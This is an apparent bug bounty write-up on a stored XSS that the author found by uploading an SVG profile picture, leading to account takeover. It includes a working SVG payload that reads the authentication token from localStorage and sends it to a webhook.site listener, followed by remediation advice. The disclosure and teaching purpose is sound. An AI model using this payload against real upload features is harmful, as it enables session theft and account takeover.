---
title: SAR 2,629 For Stored XSS via svg Image Leading to ATO
url: https://infosecwriteups.com/sar-2-629-for-stored-xss-via-svg-image-leading-to-ato-1916c50251dc?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2026-07-17
fetch_date: 2026-07-18T04:45:04.475100
---

# SAR 2,629 For Stored XSS via svg Image Leading to ATO

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fsar-2-629-for-stored-xss-via-svg-image-leading-to-ato-1916c50251dc&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=---top_nav_layout_nav-----------------------------------------)

Get app

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fsar-2-629-for-stored-xss-via-svg-image-leading-to-ato-1916c50251dc&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![Unknown user](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-1916c50251dc---------------------------------------)

·

1. [Hacking via Pictures: Stored XSS via SVG Leading to Account Takeover](/?source=post_page-----1916c50251dc---------------------------------------#16b5 "Hacking via Pictures: Stored XSS via SVG Leading to Account Takeover")
2. [The Discovery](/?source=post_page-----1916c50251dc---------------------------------------#52d1 "The Discovery")
3. [Steps to Reproduce](/?source=post_page-----1916c50251dc---------------------------------------#3100 "Steps to Reproduce")
4. [1. Navigate to the Target](/?source=post_page-----1916c50251dc---------------------------------------#789d "1. Navigate to the Target")
5. [2. Create the Malicious Payload](/?source=post_page-----1916c50251dc---------------------------------------#9c06 "2. Create the Malicious Payload")
6. [3. Upload the Image](/?source=post_page-----1916c50251dc---------------------------------------#455a "3. Upload the Image")
7. [The Impact](/?source=post_page-----1916c50251dc---------------------------------------#b585 "The Impact")
8. [Remediation](/?source=post_page-----1916c50251dc---------------------------------------#da52 "Remediation")

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-1916c50251dc---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

# SAR 2,629 For Stored XSS via svg Image Leading to ATO

[![Anas NadY](https://miro.medium.com/v2/resize:fill:64:64/1*7M9J9UNPG2jyrUAW_psYaw.jpeg)](https://medium.com/%40anas-nady?source=post_page---byline--1916c50251dc---------------------------------------)

[Anas NadY](https://medium.com/%40anas-nady?source=post_page---byline--1916c50251dc---------------------------------------)

3 min read

·

Jan 4, 2026

--

3

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3D1916c50251dc&operation=register&redirect=https%3A%2F%2Finfosecwriteups.com%2Fsar-2-629-for-stored-xss-via-svg-image-leading-to-ato-1916c50251dc&source=---header_actions--1916c50251dc---------------------post_audio_button------------------)

Share

Press enter or click to view image in full size

![]()

REPORT BOUNTY

### Hacking via Pictures: Stored XSS via SVG Leading to Account Takeover

Hello everyone! 👋

In this write-up, I want to share an interesting finding: a Stored Cross-Site Scripting (XSS) vulnerability hidden inside a profile picture upload feature.

By simply uploading a malicious SVG image, I was able to execute JavaScript code and **steal authentication tokens stored in `localStorage`, leading to a full Account Takeover**.

Let’s dive into how it happened!

### The Discovery

While hunting on a program from the [BugBounty.sa](https://bugbounty.sa) platform, I focused on the user profile settings. I noticed the application allowed users to upload profile pictures, so I immediately checked if it accepted SVG (Scalable Vector Graphics) files.

During my reconnaissance, **I found three critical pieces of information that made this attack possible:**

1. **Storage Mechanism**: I inspected the application’s storage and found that the session credentials (authentication tokens) were stored in the browser’s `**localStorage**`.
2. **Same-Origin Hosting:** I noticed that uploaded photos were hosted \*\*self-hosted on the same domain\*\* (e.g., `[https://redacted.com/photos/...`](https://redacted.com/photos/...%60)) rather than on a separate CDN or sandbox domain. This is crucial because scripts running inside the image share the same origin as the main application, allowing them to access `localStorage`.

**3. Missing CSP:** The application had a missing or misconfigured \*\*Content Security Policy (CSP)\*\*, allowing inline scripts to execute.

### Steps to Reproduce

### 1. Navigate to the Target

I logged into my account and went to the \*\*Account Details\*\* page.

\*\*URL:\*\* `[https://](https://my.hcloud.sa/account/details%60)[redacted](https://redacted.com/photos/...%60)[.com/account/details`](https://my.hcloud.sa/account/details%60)

### 2. Create the Malicious Payload

I set up a listener on \*\*webhook.site\*\* to capture the stolen data. Then, I created a file named `exploit.svg`. Inside this file, I embedded a script to grab the `token` from `localStorage` and send it to my webhook.

* **\*The Payload:\*\***

```
<svg xmlns="[http://www.w3.org/2000/svg](http://www.w3.org/2000/svg)" width="400" height="400" viewBox="0 0 124 124" fill="none">
<rect width="124" height="124" rx="24" fill="#000000"/>
 <script type="text/javascript">
 var t = localStorage.getItem("token");
 if(t){
 // send token to attacker webhook
 fetch("[https://webhook.site/8c54e2aa-4731-48ec-8ff3-05c524cabd19?token=](https://webhook.site/8c54e2aa-4731-48ec-8ff3-05c524cabd19?token=)" + encodeURIComponent(t));
 }
 alert(t);
 </script>
</svg>
```

### 3. Upload the Image

I clicked the upload button and selected my `exploit.svg` file. The application accepted it without any errors! ✅

## Get Anas NadY’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

[x]

Remember me for faster sign in

Once uploaded, I right-clicked the profile image and selected **“Open image in new tab”**.

As soon as the browser rendered the SVG, the JavaScript executed. 💥

* An alert box popped up with the token.
* The token was silently sent to my webhook listener.

Press enter or click to view image in full size

![]()

XSS Popup

Press enter or click to view image in full size

![]()

WEBGOOK

### The Impact

This wasn’t just a simple popup. By accessing `localStorage`, I could extract the **Authentication Token**.

With this token, an attacker can:

* **Take over the account** without a password.
* View sensitive personal information (PII).
* Perform actions on behalf of the victim (admin or user).

### Remediation

To fix this, developers should:

* **Sanitize SVGs:** Remove `<script>` tags and event handlers (like `onload`) before saving the file.
* **Content Security Policy (CSP):** Implement a strict CSP to block inline scripts.
* **Force Content-Disposition:** Serve user-uploaded images as `attachment` so browsers download them instead of rendering them.

Happy Hacking!

Bug Bounty

Bug Bounty Tips

Bug Bounty Writeup

Pene...